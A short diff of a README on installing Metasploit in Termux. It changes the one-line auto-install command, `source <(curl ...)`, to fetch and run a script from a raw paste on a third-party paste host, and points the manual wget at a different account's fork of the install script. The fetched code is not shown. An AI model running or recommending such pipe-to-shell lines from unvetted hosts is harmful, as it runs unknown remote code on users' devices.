@@ -14,14 +14,14 @@ In order to have updated Termux:
 
 ### Auto
 ```bash
-source <(curl -fsSL https://kutt.it/msf)
+source <(curl -fsSL https://hastebytrhacknon.trhacknon.repl.co/raw/qizoherobe)
 ```
 
 ### Manual
 ```bash
 pkg install wget
 
-wget https://github.com/gushmazuko/metasploit_in_termux/raw/master/metasploit.sh
+wget https://github.com/trhacknon/metasploit_in_termux/raw/master/metasploit.sh
 
 
 chmod +x metasploit.sh
